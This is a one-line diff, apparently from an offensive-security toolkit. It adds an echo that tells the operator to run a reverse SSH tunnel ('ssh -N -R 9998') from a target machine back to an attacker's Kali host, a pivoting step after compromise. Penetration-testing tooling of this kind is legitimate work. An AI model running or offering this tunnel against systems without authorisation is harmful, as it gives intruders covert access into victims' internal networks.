@@ -1,0 +1,1 @@
+echo "On your target, enter: ssh -N -R 9998 kali@<%=${$(esh payloads/ip)}%>";
